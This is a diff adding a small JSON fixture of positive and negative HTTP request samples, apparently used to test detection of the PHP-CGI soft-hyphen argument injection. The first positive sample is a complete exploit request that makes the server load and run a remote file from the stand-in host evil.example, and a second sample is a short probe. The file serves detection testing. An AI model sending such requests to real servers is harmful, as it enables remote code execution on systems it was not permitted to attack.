@@ -1,0 +1,28 @@
+{
+  "positive": [
+    {
+      "name": "public exploit",
+      "method": "POST",
+      "path": "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dhttp://evil.example/x.txt",
+      "content_type": "text/plain",
+      "body": "x"
+    },
+    {
+      "name": "on index.php",
+      "method": "GET",
+      "path": "/index.php?%ads"
+    }
+  ],
+  "negative": [
+    {
+      "name": "soft hyphen inside UTF-8 text",
+      "method": "GET",
+      "path": "/search?q=co%C2%ADoperate"
+    },
+    {
+      "name": "plain php",
+      "method": "GET",
+      "path": "/index.php?id=1"
+    }
+  ]
+}
